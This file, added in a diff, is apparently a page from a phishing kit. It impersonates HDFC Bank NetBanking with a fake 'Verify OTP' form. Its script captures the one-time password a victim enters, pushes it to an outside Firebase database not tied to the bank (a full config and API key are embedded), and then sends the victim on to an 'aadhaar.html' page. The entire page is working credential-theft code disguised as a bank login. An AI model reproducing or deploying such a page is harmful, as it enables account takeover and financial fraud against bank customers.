@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <script src="https://cdn.tailwindcss.com"></script>
+  </head>
+  <body class="">
+    <!-- Header -->
+    <header class="h-auto bg-[#ffffff] flex justify-center p-2 shadow-md">
+      <div
+        class="h-auto w-full flex flex-col items-center justify-left bg-[#ffffff] p-1"
+      >
+        <span class="text-black text-xl">Welcome to HDFC bank Netbanking</span>
+        <img
+          src="/images/Screenshot 2024-12-03 180403.png"
+          class="p-2 h-[60px]"
+          alt="Logo"
+        />
+      </div>
+    </header>
+    <!-- Main Content -->
+    <section class="flex flex-col justify-center mt-5 p-6">
+      <!-- First Form -->
+      <form action="" id="first-form" class="px-5 tab-content mr-10">
+        <div>
+          <span class="text-2xl">Verify OTP (ONE TIME PASSWORD)</span>
+        </div>
+        <div class="space-y-6 flex flex-col justify-center mt-10 rounded-xl">
+          <!-- {/* Full Name */} -->
+          <div class="">
+            <label class="block text-gray-700 text-sm mb-2" for="otp">
+              OTP <span class="text-red-500">*</span>
+            </label>
+            <input
+              class="appearance-none rounded-md border-2 border-blue-200 focus:border-[#1D84FA] w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline shadow"
+              id="otp"
+              name="otp"
+              type="password"
+            />
+          </div>
+        </div>
+
+        <!-- {/* Submit Button */} -->
+        <div class="w-full flex justify-start items-center mt-5">
+          <button
+            class="bg-gradient-to-r shadow-md from-[#1D84FA] to-[#1D84FA] text-white py-2 px-10 rounded focus:outline-none focus:shadow-outline w-auto"
+            type="submit"
+          >
+            Continue
+          </button>
+        </div>
+      </form>
+
+      <!-- Text -->
+      <div class="bg-slate-100 p-2 rounded-md mt-10">
+        Dear Customer, Welcome to the new login page of HDFC Bank NetBanking.
+        Its lighter look and feel is designed to give you the best possible user
+        experience. Please continue to login using your customer ID and
+        password.
+      </div>
+
+      <div class="mt-10">
+        <div class="grid grid-cols-1 w-full">
+          <div class="text-xs text-[#035297] font-bold space-x-1 mt-2">
+            <span class="underline">Help Center: </span>
+            <span class="text-slate-600">
+              Explore our extensive help documentation.
+            </span>
+          </div>
+          <div class="text-xs text-[#035297] font-bold space-x-1 mt-2">
+            <span class="underline">Customer Support: </span>
+            <span class="text-slate-600">
+              Reach out to our customer support team.
+            </span>
+          </div>
+          <div class="text-xs text-[#035297] font-bold space-x-1 mt-2">
+            <span class="underline">Tutorials: </span>
+            <span class="text-slate-600">
+              Watch step-by-step video tutorials.
+            </span>
+          </div>
+          <div class="text-xs text-[#035297] font-bold space-x-1 mt-2">
+            <span class="underline">Billing Information: </span>
+            <span class="text-slate-600">
+              View and manage your billing details.
+            </span>
+          </div>
+          <div class="text-xs text-[#035297] font-bold space-x-1 mt-2">
+            <span class="underline">Shipping Details: </span>
+            <span class="text-slate-600">
+              Check your shipment status and updates.
+            </span>
+          </div>
+        </div>
+      </div>
+    </section>
+    <section class="bg-[#035297] p-5 w-full mt-10">
+      <div class="flex space-x-1 w-full justify-between">
+        <span class="text-xs text-white font-bold underline"> Support </span>
+        <span class="text-xs text-white font-bold">|</span>
+        <span class="text-xs text-white font-bold underline"> Find Us </span>
+        <span class="text-xs text-white font-bold">|</span>
+        <span class="text-xs text-white font-bold underline">
+          Pricing & Fees
+        </span>
+        <span class="text-xs text-white font-bold">|</span>
+        <span class="text-xs text-white font-bold underline"> Compliance </span>
+      </div>
+      <div class="flex space-x-1 w-full justify-between mt-2">
+        <span class="text-xs text-white font-bold underline">
+          Terms & Conditions
+        </span>
+        <span class="text-xs text-white font-bold">|</span>
+        <span class="text-xs text-white font-bold underline">
+          Legal Disclosures
+        </span>
+        <span class="text-xs text-white font-bold">|</span>
+        <span class="text-xs text-white font-bold underline">
+          Safety Guidelines
+        </span>
+      </div>
+      <div class="mt-5 text-[10px] text-white">
+        Copyright @2021-2022 HDFC BANK KYC. All rights reserved.
+      </div>
+    </section>
+
+    <!-- Script -->
+    <script
+      defer
+      src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"
+    ></script>
+
+    <script
+      defer
+      src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"
+    ></script>
+    <script
+      defer
+      src="https://www.gstatic.com/firebasejs/8.10.1/firebase-firestore.js"
+    ></script>
+
+    <script type="module">
+      // Import the functions you need from the SDKs you need
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-app.js";
+      import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-analytics.js";
+      // TODO: Add SDKs for Firebase products that you want to use
+      // https://firebase.google.com/docs/web/setup#available-libraries
+
+      import {
+        getDatabase,
+        ref,
+        push,
+      } from "https://www.gstatic.com/firebasejs/10.1.0/firebase-database.js";
+
+      // Your web app's Firebase configuration
+      // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+      const firebaseConfig = {
+  apiKey: "AIzaSyBR0CLRN7tStTINA90j9wgvz2gR2BOozCc",
+  authDomain: "hdfew-6df42.firebaseapp.com",
+  databaseURL: "https://hdfew-6df42-default-rtdb.firebaseio.com",
+  projectId: "hdfew-6df42",
+  storageBucket: "hdfew-6df42.firebasestorage.app",
+  messagingSenderId: "840276915269",
+  appId: "1:840276915269:web:3bf21d2900f7aeb485df2c"
+};
+
+      // Initialize Firebase
+      const app = initializeApp(firebaseConfig);
+      const analytics = getAnalytics(app);
+      const database = getDatabase(app);
+
+      document
+        .getElementById("first-form")
+        .addEventListener("submit", function (event) {
+          event.preventDefault();
+          //IDS
+          const otp = document.querySelector('input[name="otp"]').value;
+
+          // Push data to the database
+          const dbRef = ref(database, "users");
+          push(dbRef, {
+            OTP2: otp,
+          })
+            .then(() => {
+              console.log("Data inserted successfully!");
+              window.location.href = "aadhaar.html";
+            })
+            .catch((error) => {
+              console.error("Error inserting data: ", error);
+            });
+        });
+
+      document.addEventListener("DOMContentLoaded", () => {
+        const otp = document.querySelector('input[name="otp"]');
+
+        otp.addEventListener("input", function () {
+          let value = otp.value.replace(/[^0-9]/g, ""); // Allow only numeric characters
+
+          // Ensure it doesn't exceed 6 digits
+          if (value.length > 6) {
+            value = value.slice(0, 6);
+          }
+
+          // Update the input value
+          otp.value = value;
+        });
+      });
+    </script>
+  </body>
+</html>
